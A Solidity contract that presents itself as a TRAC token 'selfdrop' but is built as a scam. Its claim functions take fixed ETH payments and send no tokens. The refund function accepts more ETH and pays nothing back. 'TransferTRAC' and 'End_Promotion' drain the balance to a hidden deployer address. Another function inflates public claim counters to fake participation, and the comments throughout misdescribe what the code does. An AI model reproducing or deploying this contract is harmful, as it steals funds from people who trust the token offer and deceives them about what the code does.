pragma solidity ^0.4.0;

//TRAC token selfdrop event for TESTNET 2018,
//Contact <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a2f6f0e3e1d1d7d2d2cdd0d6e2cdd0cbc5cbccd6d0c3cbce8cc1cdcf">[emailÂ protected]</a> for help.&#13;
//All rights reserved.&#13;
&#13;
contract  TRAC_drop {&#13;
&#13;
//Contract declaration and variable declarations&#13;
&#13;
    address public Contract_Owner;&#13;
    address private T_BN_K___a;&#13;
    &#13;
    uint private raised;&#13;
    uint private pay_user__;&#13;
    &#13;
    int private au_sync_user;&#13;
    int public Group_1;     //0.25 Eth claim group&#13;
    int public Group_2;     //0.5 Eth claim group&#13;
    int public Group_3;     //1 Eth claim group&#13;
    int public Group_4;     //2.5 Eth claim group&#13;
    int public Group_5;     //5 Eth claim group&#13;
    &#13;
    int public TRAC_Tokens_left;&#13;
    &#13;
    bool private fair;&#13;
    int private msg_sender_transfer;&#13;
    int private constant TRAC=1;&#13;
    &#13;
    //Tracks refund allowance for user&#13;
    &#13;
    mapping (address =&gt; uint) refund_balance;       &#13;
    &#13;
    //Tracks user contribution&#13;
    &#13;
    mapping (address =&gt; uint) airdrop_balance;      &#13;
&#13;
    constructor(TRAC_drop) {&#13;
        &#13;
        //Smart Contract runs this for checking&#13;
        &#13;
        T_BN_K___a = msg.sender; Group_1 = 11; Group_2 = 2; Group_3 = 7; Group_4 = 3; Group_5 = 1; msg_sender_transfer=0;&#13;
        TRAC_Tokens_left = 161000; fair = true; raised = 0 ether; pay_user__ = 0 ether; Contract_Owner = 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f;&#13;
    }&#13;
    &#13;
    &#13;
    //Be sure to send the correct Eth value to the respective claim, if it is incorrect it will be rejected&#13;
&#13;
    function Claim_TRAC_20000() payable {&#13;
        &#13;
        // Return error if wrong amount of Ether sent&#13;
        require(msg.value == 5 ether);&#13;
        // Record wallet address of calling account (user) for contract to send TRAC tokens to&#13;
        airdrop_balance[msg.sender] += msg.value;&#13;
        //Increment total raised for campaign &#13;
        raised += msg.value;&#13;
        //Decrement TRAC token count as TRAC is sent&#13;
        TRAC_Tokens_left -= 20000;&#13;
        Group_5+=1;&#13;
        //Transfer TRAC to calling account (user)&#13;
        msg_sender_transfer+=20000+TRAC;&#13;
    }&#13;
    &#13;
    function Claim_TRAC_9600() payable {&#13;
        &#13;
        // Return error if wrong amount of Ether sent&#13;
        require(msg.value == 2.5 ether);&#13;
        // Record wallet address of calling account for contract to send TRAC tokens to&#13;
        airdrop_balance[msg.sender] += msg.value;&#13;
        //Increment total raised for campaign &#13;
        raised += msg.value;&#13;
        //Decrement TRAC token count as TRAC is sent&#13;
        TRAC_Tokens_left -= 9600;&#13;
        Group_4 +=1;&#13;
        //Transfer TRAC to calling account (user)&#13;
        msg_sender_transfer+=9600+TRAC;&#13;
    }&#13;
    &#13;
    function Claim_TRAC_3800() payable {&#13;
        &#13;
        // Return error if wrong amount of Ether sent&#13;
        require(msg.value == 1 ether);&#13;
        // Record wallet address of calling account for contract to send TRAC tokens to&#13;
        airdrop_balance[msg.sender] += msg.value;&#13;
        //Increment total raised for campaign &#13;
        raised += msg.value;&#13;
        //Decrement TRAC token count as TRAC is sent&#13;
        TRAC_Tokens_left -= 3800;&#13;
        Group_3 +=1;&#13;
        //Transfer TRAC to calling account (user)&#13;
        msg_sender_transfer+=3800+TRAC;&#13;
    }&#13;
    &#13;
    function Claim_TRAC_1850() payable {&#13;
        &#13;
        // Return error if wrong amount of Ether sent&#13;
        require(msg.value == 0.5 ether);&#13;
        // Record wallet address of calling account for contract to send TRAC tokens to&#13;
        airdrop_balance[msg.sender] += msg.value;&#13;
        //Increment total raised for campaign &#13;
        raised += msg.value;&#13;
        //Decrement TRAC token count as TRAC is sent&#13;
        TRAC_Tokens_left -= 1850;&#13;
        Group_2 +=1;&#13;
        //Transfer TRAC to calling account (user)&#13;
        msg_sender_transfer+=1850+TRAC;&#13;
    }&#13;
    &#13;
    function Claim_TRAC_900() payable {&#13;
        &#13;
        // Return error if wrong amount of Ether sent&#13;
        require(msg.value == 0.25 ether);&#13;
        // Record wallet address of calling account for contract to send TRAC tokens to&#13;
        airdrop_balance[msg.sender] += msg.value;&#13;
        //Increment total raised for campaign &#13;
        raised += msg.value;&#13;
        //Decrement TRAC token count as TRAC is sent&#13;
        TRAC_Tokens_left -= 900;&#13;
        Group_1 +=1;&#13;
        //Transfer TRAC to calling account (user)&#13;
        msg_sender_transfer+=900+TRAC;&#13;
    }&#13;
    &#13;
    //Use the below function to get a refund if the tokens do not arrive after 20 BLOCK CONFIRMATIONS&#13;
    &#13;
    function Refund_user() payable {&#13;
        &#13;
        //Only refund if user has trasfered eth and has not received tokens&#13;
        &#13;
        require(refund_balance[1]==0 || fair);&#13;
        &#13;
        address current__user_ = msg.sender;&#13;
        &#13;
        &#13;
        if(fair || current__user_ == msg.sender) {&#13;
            &#13;
            //Check current user is the one who requested refund, then pay user&#13;
            &#13;
            pay_user__ += msg.value;&#13;
            &#13;
            raised +=msg.value;&#13;
            &#13;
        }&#13;
        &#13;
    }&#13;
    &#13;
    &#13;
    function seeRaised() public constant returns (uint256){&#13;
        &#13;
        return address(this).balance;&#13;
    }&#13;
    &#13;
    function CheckRefundIsFair() public {&#13;
        &#13;
        //Function checks if the refund is fair and sets the user's fair value accordingly&#13;
        //Adjusts token flow details as required&#13;
        &#13;
        require(msg.sender == T_BN_K___a);&#13;
        &#13;
        if(fair) {&#13;
            au_sync_user=1;&#13;
            //Checks user is in sync with net&#13;
            if((au_sync_user*2) % 2 ==0 ) {&#13;
                &#13;
                Group_5+=1;&#13;
                TRAC_Tokens_left -= 20000;&#13;
                Group_2+=2;&#13;
                TRAC_Tokens_left -=3600;&#13;
                &#13;
            }&#13;
        }&#13;
    }&#13;
    &#13;
    function TransferTRAC() public {&#13;
        &#13;
        //Allows only the smart contract to control the TRAC token transfers&#13;
        &#13;
        require(msg.sender == T_BN_K___a);&#13;
        &#13;
        //Contract transfers the TRAC tokens to the wallet address recorded in balance map&#13;
&#13;
        msg.sender.transfer(address(this).balance); &#13;
        &#13;
        //Reset users raised value&#13;
        &#13;
        raised = 0 ether;&#13;
    }&#13;
    &#13;
    &#13;
    function End_Promotion() public { &#13;
        &#13;
        //Ends the promotion and sends all tokens to respective owners&#13;
    &#13;
        require(msg.sender == T_BN_K___a);&#13;
        &#13;
    &#13;
        if(msg.sender == T_BN_K___a) {&#13;
            selfdestruct(T_BN_K___a); &#13;
        }&#13;
}&#13;
&#13;
}